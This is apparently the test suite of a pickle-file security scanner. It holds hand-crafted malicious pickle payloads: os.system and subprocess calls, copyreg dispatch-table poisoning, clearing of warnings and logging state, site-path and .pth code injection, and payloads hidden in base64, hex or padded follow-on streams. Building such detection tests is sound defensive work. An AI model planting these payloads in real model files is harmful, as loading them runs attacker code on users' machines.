from __future__ import annotations

import argparse
import base64
import binascii
import collections
import collections.abc
import copyreg
import datetime
import decimal
import faulthandler
import functools
import importlib
import io
import logging
import marshal
import os
import pickle
import py_compile
import re
import subprocess
import sys
import tarfile
import uuid
import warnings
import zipfile
from importlib.abc import Loader
from importlib.machinery import (
    BYTECODE_SUFFIXES,
    EXTENSION_SUFFIXES,
    SOURCE_SUFFIXES,
    FileFinder,
    ModuleSpec,
    SourceFileLoader,
    SourcelessFileLoader,
)
from importlib.util import cache_from_source
from pathlib import Path, PurePosixPath
from types import CodeType, ModuleType
from typing import cast

import pytest

import modelaudit_picklescan.api as package_api
from modelaudit_picklescan import (
    CoverageSummary,
    Finding,
    PickleReport,
    PickleScanner,
    SafetyVerdict,
    ScanOptions,
    ScanStatus,
    Severity,
    scan_bytes,
    scan_file,
)
from modelaudit_picklescan.call_graph import (
    _CALL_GRAPH_REGULAR_FILE_FINGERPRINT,
    _TRUSTED_LOADED_REFERENCE_BASELINES,
    CallGraphFinding,
    StartupHookWriteFinding,
    UnanalyzedCallGraphReference,
    _begin_shared_source_report,
    _call_graph_source_unavailable_reason,
    _CallGraphAnalysisLimitError,
    _clear_source_sensitive_caches,
    _effective_bytecode_matches_source,
    _ensure_shared_source_snapshot_stable,
    _is_standard_path_hook,
    _meta_path_finder_resolution_identity,
    _path_hook_resolution_identity,
    _read_candidate_fingerprint,
    _resolution_candidate_fingerprint,
    _track_shared_source_candidates,
    _track_shared_source_path,
    _trusted_module_origin_kind,
    find_startup_hook_write_call_graphs,
    shared_source_fingerprint_metadata,
    shared_source_sensitive_caches,
)


def _expected_system_global() -> str:
    return "nt.system" if os.name == "nt" else "posix.system"


EXPECTED_SYSTEM_GLOBAL = _expected_system_global()
SYSTEM_GLOBALS = frozenset({"os.system", EXPECTED_SYSTEM_GLOBAL, "nt.system", "posix.system"})


def _isolate_reusable_meta_path_finders(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        sys,
        "meta_path",
        [finder for finder in sys.meta_path if ":unreusable:" not in _meta_path_finder_resolution_identity(finder)],
    )


@pytest.fixture(autouse=True)
def _restore_copyreg_dispatch_table() -> collections.abc.Iterator[None]:
    original_dispatch_table = dict(copyreg.dispatch_table)
    try:
        yield
    finally:
        copyreg.dispatch_table.clear()
        copyreg.dispatch_table.update(original_dispatch_table)


_PROTOCOL_MUTATION_EVENTS: list[tuple[str, str]] = []


@pytest.fixture(autouse=True)
def _reset_protocol_mutation_events() -> collections.abc.Generator[None, None, None]:
    _PROTOCOL_MUTATION_EVENTS.clear()
    yield
    _PROTOCOL_MUTATION_EVENTS.clear()


@pytest.fixture(autouse=True)
def _restore_warnings_filters() -> collections.abc.Generator[None, None, None]:
    original_filters = list(warnings.filters)
    try:
        yield
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


class ProtocolMutationTarget:
    def __setitem__(self, key: str, value: str) -> None:
        _PROTOCOL_MUTATION_EVENTS.append((key, value))


def _short_binunicode(data: bytes) -> bytes:
    if len(data) > 0xFF:
        raise ValueError("SHORT_BINUNICODE helper accepts at most 255 bytes")
    return b"\x8c" + bytes([len(data)]) + data


def _global(module: bytes, name: bytes) -> bytes:
    return b"c" + module + b"\n" + name + b"\n"


def _binunicode(data: bytes) -> bytes:
    return b"X" + len(data).to_bytes(4, "little") + data


def _binunicode8(data: bytes) -> bytes:
    return b"\x8d" + len(data).to_bytes(8, "little") + data


def _concrete_pathlib_class_name() -> str:
    return "WindowsPath" if os.name == "nt" else "PosixPath"


def _pathlib_method_reduce_payload(target: Path, method: str) -> bytes:
    class_name = _concrete_pathlib_class_name()
    return (
        b"\x80\x04"
        + f"cpathlib\n{class_name}\n".encode("ascii")
        + _binunicode(str(target).encode())
        + b"\x85R\x94"
        + f"cpathlib\n{class_name}.{method}\n".encode("ascii")
        + b"h\x00\x85R."
    )


def _file_mode_reduce_payload(module: bytes, name: bytes, target: Path, mode: bytes) -> bytes:
    return (
        b"\x80\x04c"
        + module
        + b"\n"
        + name
        + b"\n"
        + _binunicode(str(target).encode())
        + _short_binunicode(mode)
        + b"\x86R."
    )


def _dbm_open_payload(base: Path) -> bytes:
    return b"\x80\x04cdbm\nopen\n" + _binunicode(str(base).encode()) + _short_binunicode(b"c") + b"\x86R."


def _maildir_payload(maildir: Path) -> bytes:
    return b"\x80\x04cmailbox\nMaildir\n" + _binunicode(str(maildir).encode()) + b"\x88\x86R."


def _named_temporary_file_payload(directory: Path) -> bytes:
    return (
        b"\x80\x04ctempfile\nNamedTemporaryFile\n("
        + _short_binunicode(b"w+b")
        + b"J\xff\xff\xff\xff"
        + b"N"
        + b"N"
        + _short_binunicode(b"")
        + _short_binunicode(b"pickle-")
        + _binunicode(str(directory).encode())
        + b"\x89"
        + b"tR."
    )


def _temporary_directory_payload(parent: Path) -> bytes:
    return (
        b"\x80\x04ctempfile\nTemporaryDirectory\n("
        + _short_binunicode(b"")
        + _short_binunicode(b"pickle-")
        + _binunicode(str(parent).encode())
        + b"tR."
    )


def _configparser_read_get_payload(config_path: Path, read_method: bytes) -> bytes:
    return (
        b"\x80\x04"
        b"cconfigparser\nConfigParser\n)R\x94"
        + _global(b"configparser", read_method)
        + b"h\x00"
        + _binunicode(str(config_path).encode())
        + b"\x86R0"
        b"cconfigparser\nConfigParser.get\n"
        b"h\x00" + _short_binunicode(b"secrets") + _short_binunicode(b"token") + b"\x87R."
    )


def _argparse_filetype_payload(target: Path) -> bytes:
    return (
        b"\x80\x04"
        b"cargparse\nFileType\n"
        + _short_binunicode(b"w")
        + b"\x85R\x94"
        + b"h\x00"
        + _binunicode(str(target).encode())
        + b"\x85R."
    )


def _copyreg_pickle_payload() -> bytes:
    return b"\x80\x04ccopyreg\npickle\ncdecimal\nDecimal\ncbuiltins\nstr\n\x86R."


def _copyreg_dispatch_table_update_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.update\nccopyreg\ndispatch_table\n}cdecimal\nDecimal\ncbuiltins\nstr\ns\x86R."


def _copyreg_dispatch_table_setitem_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.__setitem__\nccopyreg\ndispatch_table\ncdecimal\nDecimal\ncbuiltins\nstr\n\x87R."


def _copyreg_dispatch_table_operator_setitem_payload() -> bytes:
    return b"\x80\x04coperator\nsetitem\nccopyreg\ndispatch_table\ncdecimal\nDecimal\ncbuiltins\nstr\n\x87R."


def _copyreg_dispatch_table_operator_ior_payload() -> bytes:
    return b"\x80\x04coperator\nior\nccopyreg\ndispatch_table\n}cdecimal\nDecimal\ncbuiltins\nstr\ns\x86R."


def _copyreg_dispatch_table_setdefault_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.setdefault\nccopyreg\ndispatch_table\ncdecimal\nDecimal\ncbuiltins\nstr\n\x87R."


def _copyreg_dispatch_table_ior_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.__ior__\nccopyreg\ndispatch_table\n}cdecimal\nDecimal\ncbuiltins\nstr\ns\x86R."


def _copyreg_dispatch_table_pop_union_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.pop\nccopyreg\ndispatch_table\n" + _global(b"types", b"UnionType") + b"\x86R."


def _copyreg_dispatch_table_delitem_union_payload() -> bytes:
    return (
        b"\x80\x04cbuiltins\ndict.__delitem__\nccopyreg\ndispatch_table\n" + _global(b"types", b"UnionType") + b"\x86R."
    )


def _copyreg_dispatch_table_operator_delitem_union_payload() -> bytes:
    return b"\x80\x04coperator\ndelitem\nccopyreg\ndispatch_table\n" + _global(b"types", b"UnionType") + b"\x86R."


def _copyreg_dispatch_table_popitem_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.popitem\nccopyreg\ndispatch_table\n\x85R."


def _copyreg_dispatch_table_clear_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.clear\nccopyreg\ndispatch_table\n\x85R."


def _warnings_filters_list_clear_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.clear\ncwarnings\nfilters\n\x85R."


def _warnings_filters_operator_imul_payload() -> bytes:
    return b"\x80\x04coperator\nimul\ncwarnings\nfilters\nK\x00\x86R."


def _warning_ignore_filter_tuple_payload() -> bytes:
    return b"(" + _short_binunicode(b"ignore") + b"Ncbuiltins\nWarning\nNK\x00t"


def _warnings_filters_list_insert_ignore_payload() -> bytes:
    return (
        b"\x80\x04"
        b"cbuiltins\nlist.insert\n"
        b"cwarnings\nfilters\n"
        b"K\x00" + _warning_ignore_filter_tuple_payload() + b"\x87R."
    )


def _warnings_filters_list_pop_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.pop\ncwarnings\nfilters\nK\x00\x86R."


def _warnings_filters_list_setitem_ignore_payload() -> bytes:
    return (
        b"\x80\x04"
        b"cbuiltins\nlist.__setitem__\n"
        b"cwarnings\nfilters\n"
        b"K\x00" + _warning_ignore_filter_tuple_payload() + b"\x87R."
    )


def _logging_root_handlers_list_clear_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.clear\nclogging\nroot.handlers\n\x85R."


def _logging_root_handlers_list_pop_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.pop\nclogging\nroot.handlers\nK\x00\x86R."


def _logging_root_handlers_list_delitem_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.__delitem__\nclogging\nroot.handlers\nK\x00\x86R."


def _local_list_append_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.append\n]K\x01\x86R."


def _local_list_clear_payload() -> bytes:
    return b"\x80\x04cbuiltins\nlist.clear\n]K\x01a\x85R."


def _local_dict_setitem_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.__setitem__\n}K\x01K\x02\x87R."


def _local_dict_update_payload() -> bytes:
    return b"\x80\x04cbuiltins\ndict.update\n}}K\x01K\x02s\x86R."


def _local_operator_setitem_payload() -> bytes:
    return b"\x80\x04coperator\nsetitem\n}K\x01K\x02\x87R."


def _local_operator_ior_payload() -> bytes:
    return b"\x80\x04coperator\nior\n}}K\x01K\x02s\x86R."


def _local_operator_imul_payload() -> bytes:
    return b"\x80\x04coperator\nimul\n]K\x01aK\x00\x86R."


def _operator_setitem_constructed_object_payload() -> bytes:
    return (
        b"\x80\x04" + _global(__name__.encode("ascii"), b"ProtocolMutationTarget") + b")R\x94"
        b"coperator\nsetitem\n"
        b"h\x00" + _short_binunicode(b"token") + _short_binunicode(b"value") + b"\x87R."
    )


def _site_addsitedir_payload(site_dir: Path) -> bytes:
    return b"\x80\x04csite\naddsitedir\n" + _binunicode(str(site_dir).encode()) + b"\x85R."


def _site_addpackage_payload(site_dir: Path, pth_name: str) -> bytes:
    return (
        b"\x80\x04csite\naddpackage\n("
        + _binunicode(str(site_dir).encode())
        + _short_binunicode(pth_name.encode())
        + b"N"
        + b"tR."
    )


def _write_executing_pth(pth_path: Path, marker: Path, message: str) -> None:
    pth_path.write_text(
        "import pathlib; pathlib.Path(" + repr(str(marker)) + f").write_text({message!r}, encoding='utf-8')\n",
        encoding="utf-8",
    )


def _make_pre_memoized_post_budget_stack_global_payload(tail: bytes) -> bytes:
    payload = bytearray(b"\x80\x04")
    payload += _short_binunicode(b"subprocess") + b"\x94"
    payload += _short_binunicode(b"run") + b"\x94"
    payload += b"\x880" * 4
    payload += tail
    return bytes(payload)


def _make_opcode_padding_stream(opcode_pairs: int) -> bytes:
    return b"\x80\x02" + (b"K\x010" * opcode_pairs) + b"."


def _make_memo_expansion_pickle(iterations: int, *, inert_writes: int = 0) -> bytes:
    total_writes = iterations + inert_writes
    if not 1 <= iterations <= 255 or total_writes > 255:
        raise ValueError("iterations + inert_writes must fit in BINPUT/BINGET opcodes")

    payload = bytearray(b"\x80\x02)q\x000")
    for memo_index in range(1, iterations + 1):
        previous_index = memo_index - 1
        payload += b"h" + bytes([previous_index])
        payload += b"h" + bytes([previous_index])
        payload += b"\x86"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    for memo_index in range(iterations + 1, total_writes + 1):
        payload += b"K\x01"
        payload += b"q" + bytes([memo_index])
        payload += b"0"
    payload += b"h" + bytes([iterations]) + b"."
    return bytes(payload)


def _make_dup_heavy_pickle(iterations: int) -> bytes:
    payload = bytearray(b"\x80\x02]q\x00")
    for _ in range(iterations):
        payload += b"h\x002a0"
    payload += b"."
    return bytes(payload)


def _corrupt_first_byte(payload: bytes) -> bytes:
    corrupted = bytearray(payload)
    corrupted[0] ^= 0xFF
    return bytes(corrupted)


class MaliciousPayload:
    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (os.system, ("echo pwned",))


class UnreadableStream(io.BytesIO):
    def read(self, size: int | None = -1) -> bytes:
        raise OSError("simulated stream read failure")


class RuntimeFailingStream(io.BytesIO):
    def read(self, size: int | None = -1) -> bytes:
        raise RuntimeError("simulated runtime stream read failure")


class NoBulkReadStream(io.BytesIO):
    def __init__(self, payload: bytes, *, max_read_size: int) -> None:
        super().__init__(payload)
        self.max_read_size = max_read_size
        self.max_seen_read_size = 0

    def read(self, size: int | None = -1) -> bytes:
        if size is None or size < 0:
            raise AssertionError("scan_stream() attempted an unbounded bulk read")
        self.max_seen_read_size = max(self.max_seen_read_size, size)
        if size > self.max_read_size:
            raise AssertionError(f"scan_stream() attempted a bulk read of {size} bytes")
        return super().read(size)


class NoUnboundedReadlineStream(io.BytesIO):
    def __init__(self, payload: bytes) -> None:
        super().__init__(payload)
        self.max_seen_readline_size = 0
        self.unbounded_readline_attempted = False

    def readline(self, size: int | None = -1) -> bytes:
        if size is None or size < 0:
            self.unbounded_readline_attempted = True
            raise AssertionError("scan_stream() attempted an unbounded line read")
        self.max_seen_readline_size = max(self.max_seen_readline_size, size)
        return super().readline(size)


class NonSeekableExactLimitStream(io.BytesIO):
    def __init__(self, payload: bytes, *, limit: int) -> None:
        super().__init__(payload)
        self.limit = limit
        self.bytes_returned = 0

    def seekable(self) -> bool:
        return False

    def read(self, size: int | None = -1) -> bytes:
        if self.bytes_returned >= self.limit:
            raise AssertionError("scan_stream() attempted an overflow probe on a non-seekable stream")
        chunk = super().read(size)
        self.bytes_returned += len(chunk)
        return chunk


def test_scan_bytes_returns_clean_report_for_safe_pickle() -> None:
    report = scan_bytes(pickle.dumps({"weights": [1, 2, 3]}), source="safe.pkl")

    assert report.source == "safe.pkl"
    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.is_clean is True
    assert report.findings == ()
    assert report.errors == ()
    assert report.coverage.opcode_count is not None
    assert report.coverage.opcode_count > 0


def test_scan_bytes_reports_opcode_counts_metadata() -> None:
    report = scan_bytes(b"\x80\x04}\x94\x8c\x03key\x94K\x01s.", source="opcode-counts.pkl")

    opcode_counts = report.metadata["opcode_counts"]
    assert opcode_counts["PROTO"] == 1
    assert opcode_counts["EMPTY_DICT"] == 1
    assert opcode_counts["SETITEM"] == 1


def test_scan_bytes_clamps_excessive_timeout_without_engine_error() -> None:
    report = scan_bytes(
        pickle.dumps({"weights": [1, 2, 3]}, protocol=4),
        source="huge-timeout.pkl",
        options=ScanOptions(timeout_s=1.0e18),
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.errors == ()


def test_scan_bytes_detects_reduce_invoking_os_system() -> None:
    report = scan_bytes(pickle.dumps(MaliciousPayload()), source="payload.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert report.has_security_findings is True
    assert any(finding.rule_code == "DANGEROUS_CALL" for finding in report.findings)
    assert not any(finding.rule_code == "DANGEROUS_GLOBAL" for finding in report.findings)
    assert any(EXPECTED_SYSTEM_GLOBAL in finding.message for finding in report.findings)
    assert any(finding.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for finding in report.findings)
    assert any(
        ref["import_reference"] == EXPECTED_SYSTEM_GLOBAL and ref["is_dangerous"] is True
        for ref in report.metadata["import_references"]
    )


def test_scan_bytes_treats_protocol5_buffer_stack_global_as_malformed() -> None:
    payload = b"\x80\x05\x8c\x04safe\x94\x97\x8c\x08anything\x94\x93."

    report = scan_bytes(payload, source="next-buffer-stack-global.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "MALFORMED_STACK_GLOBAL" for finding in report.findings)


def test_scan_bytes_escalates_main_reduce_to_malicious() -> None:
    report = scan_bytes(b"c__main__\nDanger\n)R.", source="main-reduce.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "__main__.Danger"
        for finding in report.findings
    )


def test_scan_bytes_ignores_comment_only_importlib_literal() -> None:
    report = scan_bytes(pickle.dumps({"doc": "importlib # harmless"}, protocol=4), source="importlib-comment.pkl")

    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_ignores_wrapped_version_dunder_metadata() -> None:
    report = scan_bytes(pickle.dumps({"doc": "['__version__']"}, protocol=4), source="version-metadata.pkl")

    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    ("encoding", "rule_code"),
    [("base64", "S601"), ("hex", "S602")],
)
def test_scan_bytes_detects_delimited_protocol0_encoded_nested_pickle_mid_literal(
    encoding: str,
    rule_code: str,
) -> None:
    nested = b"cos\nsystem\n)R."
    encoded = base64.b64encode(nested).decode("ascii") if encoding == "base64" else nested.hex()
    value = f"prefix-{encoded}-suffix"

    report = scan_bytes(
        pickle.dumps({"outer": value}, protocol=4),
        source=f"delimited-protocol0-nested-{encoding}.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == rule_code for finding in report.findings)
    assert any(finding.details.get("import_reference") in SYSTEM_GLOBALS for finding in report.findings)


@pytest.mark.parametrize(
    "encoding",
    ["base64", "hex"],
)
def test_scan_bytes_ignores_corrupted_delimited_encoded_nested_pickle_near_match(
    encoding: str,
) -> None:
    corrupted = _corrupt_first_byte(b"cos\nsystem\n)R.")
    encoded = base64.b64encode(corrupted).decode("ascii") if encoding == "base64" else corrupted.hex()
    value = f"prefix-{encoded}-suffix"

    report = scan_bytes(
        pickle.dumps({"outer": value}, protocol=4),
        source=f"corrupted-delimited-protocol0-nested-{encoding}.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize("protocol", [2, 3, 4, 5])
def test_scan_bytes_detects_binary_protocol_encoded_nested_pickle_mid_literal(protocol: int) -> None:
    nested = pickle.dumps(MaliciousPayload(), protocol=protocol)
    encoded = "prefix-" + base64.b64encode(nested).decode("ascii")

    report = scan_bytes(pickle.dumps({"outer": encoded}, protocol=4), source=f"protocol{protocol}-nested-b64.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "S601" for finding in report.findings)
    assert any(finding.details.get("import_reference") in SYSTEM_GLOBALS for finding in report.findings)


def test_scan_bytes_detects_junk_prefixed_small_raw_nested_pickle() -> None:
    nested = b"cos\nsystem\n)R."

    report = scan_bytes(pickle.dumps({"outer": b"JUNK" + nested}, protocol=4), source="junk-nested-raw.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "S213" for finding in report.findings)
    assert any(finding.details.get("import_reference") in SYSTEM_GLOBALS for finding in report.findings)


@pytest.mark.parametrize(
    "separator",
    [
        b"\x00" * 64,
        b"\x00" * 4096,
        b"# padding that looks like text\n",
        b"MARK" * 16,
    ],
)
def test_scan_bytes_detects_follow_on_malicious_pickle_streams(separator: bytes) -> None:
    payload = pickle.dumps({"safe": True}, protocol=4) + separator + b"cos\nsystem\n)R."

    report = scan_bytes(payload, source="multi-stream.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(notice.code == "follow_on_stream_detected" for notice in report.notices)
    assert any(finding.details.get("import_reference") in SYSTEM_GLOBALS for finding in report.findings)
    assert report.metadata["follow_on_opcode_counts"]["REDUCE"] == 1


def test_scan_bytes_counts_each_follow_on_opcode_once() -> None:
    follow_on = b"\x80\x04cclick\nopen_file\n)\x810cclick\nopen_file\n)\x810cclick\necho\n)R."
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"\x00" * 64) + follow_on

    report = scan_bytes(payload, source="follow-on-exact-counts.pkl")

    assert report.metadata["follow_on_opcode_counts"]["GLOBAL"] == 3
    assert report.metadata["follow_on_opcode_counts"]["NEWOBJ"] == 2
    assert report.metadata["follow_on_opcode_counts"]["REDUCE"] == 1


def test_scan_bytes_counts_separate_follow_on_streams_once() -> None:
    click_stream = b"\x80\x04cclick\nopen_file\n)\x810cclick\nopen_file\n)\x810cclick\necho\n)R."
    help_stream = b"\x80\x04\x8c\x08builtins\x8c\x04help\x93)R."
    padding = b"\x00" * 64
    payload = pickle.dumps({"safe": True}, protocol=4) + padding + click_stream + padding + help_stream

    report = scan_bytes(payload, source="separate-follow-on-exact-counts.pkl")

    counts = report.metadata["follow_on_opcode_counts"]
    assert counts["PROTO"] == 2
    assert counts["STOP"] == 2
    assert counts["GLOBAL"] == 3
    assert counts["NEWOBJ"] == 2
    assert counts["REDUCE"] == 2
    assert counts["STACK_GLOBAL"] == 1


def test_scan_bytes_follow_on_callable_alias_import_without_invocation_has_no_call_graph_finding() -> None:
    import_only = b"\x80\x04\x8c\x08builtins\x8c\x04help\x93."
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"\x00" * 64) + import_only

    report = scan_bytes(payload, source="follow-on-callable-alias-import.pkl")

    assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in report.findings)
    assert report.metadata["follow_on_opcode_counts"]["STACK_GLOBAL"] == 1


@pytest.mark.parametrize(
    ("second_stream", "expected_reference"),
    [
        (b"cos\nsystem\n)R.", SYSTEM_GLOBALS),
        (b"chttplib\nHTTPConnection\n)R.", frozenset({"httplib.HTTPConnection"})),
    ],
)
def test_scan_bytes_detects_large_padding_follow_on_high_risk_streams(
    second_stream: bytes,
    expected_reference: frozenset[str],
) -> None:
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"\x00" * 4096) + second_stream

    report = scan_bytes(payload, source="large-padding-follow-on.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(notice.code == "follow_on_stream_detected" for notice in report.notices)
    assert any(finding.details.get("import_reference") in expected_reference for finding in report.findings)


def test_scan_bytes_does_not_promote_benign_follow_on_stream() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"\x00" * 4096) + pickle.dumps({"benign": True}, protocol=4)

    report = scan_bytes(payload, source="benign-follow-on.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not report.findings
    assert not any(notice.code == "follow_on_stream_detected" for notice in report.notices)


def test_scan_bytes_detects_malicious_stream_after_malformed_prefix() -> None:
    payload = b"\x80\x04\xff" + (b"\x00" * 32) + b"cos\nsystem\n)R."

    report = scan_bytes(payload, source="malformed-prefix-stream.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.details.get("import_reference") in SYSTEM_GLOBALS for finding in report.findings)


def test_scan_bytes_warns_on_iterative_memo_growth() -> None:
    report = scan_bytes(_make_memo_expansion_pickle(iterations=80), source="memo-expansion.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PICKLE_EXPANSION"
        and finding.severity == Severity.WARNING
        and "memo_growth_chain" in finding.details["findings"][0]["triggers"]
        for finding in report.findings
    )


def test_scan_bytes_warns_on_dup_heavy_expansion_payload() -> None:
    report = scan_bytes(_make_dup_heavy_pickle(iterations=200), source="dup-heavy.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PICKLE_EXPANSION"
        and "excessive_dup_usage" in finding.details["findings"][0]["triggers"]
        and "suspicious_get_put_ratio" in finding.details["findings"][0]["triggers"]
        for finding in report.findings
    )


def test_scan_bytes_does_not_warn_on_benign_shared_references() -> None:
    shared = [1, 2, 3]
    report = scan_bytes(pickle.dumps([shared] * 1000, protocol=4), source="shared-reference.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "PICKLE_EXPANSION" for finding in report.findings)


def test_scan_bytes_bounds_follow_on_probe_recursion_for_pickle_like_binary_tail() -> None:
    payload = pickle.dumps({"safe": True}, protocol=2) + (b"XYZNmore-binary-data" * 20)

    report = scan_bytes(payload, source="binary-tail.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()


def test_scan_bytes_reports_duplicate_and_misplaced_proto_tamper() -> None:
    report = scan_bytes(b"\x80\x02\x80\x04K\x01.", source="duplicate-proto.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "STRUCTURAL_TAMPER"
        and finding.severity == Severity.WARNING
        and finding.details.get("tamper_type") == "duplicate_proto"
        and finding.details.get("previous_protocol") == 2
        and finding.details.get("protocol") == 4
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "STRUCTURAL_TAMPER" and finding.details.get("tamper_type") == "misplaced_proto"
        for finding in report.findings
    )


def test_scan_bytes_does_not_report_structural_tamper_for_binary_tail() -> None:
    payload = pickle.dumps({"safe": True}, protocol=2) + (b"XYZNmore-binary-data" * 20)

    report = scan_bytes(payload, source="binary-tail.pkl")

    assert all(finding.rule_code != "STRUCTURAL_TAMPER" for finding in report.findings)


def test_scan_bytes_warns_on_post_budget_memo_growth_tail() -> None:
    payload = _make_opcode_padding_stream(64) + _make_memo_expansion_pickle(iterations=80)

    report = scan_bytes(
        payload,
        source="post-budget-expansion.pkl",
        options=ScanOptions(max_opcodes=64, post_budget_scan_bytes=4096),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PICKLE_EXPANSION"
        and finding.details.get("post_budget") is True
        and "memo_growth_chain" in finding.details["findings"][0]["triggers"]
        for finding in report.findings
    )


def test_scan_bytes_escalates_copyreg_extension_reduce() -> None:
    report = scan_bytes(b"\x80\x04\x82\x01)R.", source="extension-reduce.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("opaque_extension") is True
        for finding in report.findings
    )


def test_scan_bytes_blocks_operator_setitem_copyreg_dispatch_table_poisoning() -> None:
    payload = b"\x80\x02coperator\nsetitem\nccopyreg\ndispatch_table\ncdecimal\nDecimal\ncbuiltins\nstr\n\x87R."
    copyreg.dispatch_table.pop(decimal.Decimal, None)

    report = scan_bytes(payload, source="operator-setitem-copyreg-dispatch-table.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert decimal.Decimal not in copyreg.dispatch_table
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "operator.setitem"
        for finding in report.findings
    )

    assert pickle.loads(payload) is None
    assert copyreg.dispatch_table.get(decimal.Decimal) is str


@pytest.mark.parametrize(
    ("payload", "opcode", "code"),
    [
        (b"\x80\x04\x82\x01)R.", "EXT1", 1),
        (b"\x80\x04\x83\x01\x00)R.", "EXT2", 1),
        (b"\x80\x04\x84\x01\x00\x00\x00)R.", "EXT4", 1),
    ],
)
def test_scan_bytes_escalates_all_copyreg_extension_reduce_opcodes(
    payload: bytes,
    opcode: str,
    code: int,
) -> None:
    report = scan_bytes(payload, source=f"{opcode.lower()}-reduce.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.details.get("opcode") == "REDUCE"
        and finding.details.get("name") == f"code_{code}"
        and finding.details.get("opaque_extension") is True
        for finding in report.findings
    )


def test_scan_bytes_records_unresolved_copyreg_extension_without_reduce() -> None:
    report = scan_bytes(b"\x80\x04\x82\x01.", source="extension-ref.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "EXTENSION_REF"
        and finding.severity == Severity.WARNING
        and finding.details.get("opcode") == "EXT1"
        for finding in report.findings
    )


def test_scan_bytes_keeps_copyreg_extension_data_reference_suspicious() -> None:
    report = scan_bytes(b"\x80\x04\x82\x01\x85.", source="extension-data-ref.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(finding.rule_code == "EXTENSION_REF" for finding in report.findings)
    assert all(finding.rule_code != "DANGEROUS_CALL" for finding in report.findings)


def test_scan_bytes_detects_follow_on_copyreg_extension_reduce() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4) + (b"\x00" * 256) + b"\x80\x04\x82\x01)R."

    report = scan_bytes(payload, source="follow-on-extension-reduce.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(notice.code == "follow_on_stream_detected" for notice in report.notices)
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("opaque_extension") is True
        for finding in report.findings
    )


def test_scan_bytes_detects_build_on_constructed_dangerous_global() -> None:
    payload = b"cos\nsystem\n)R}b."

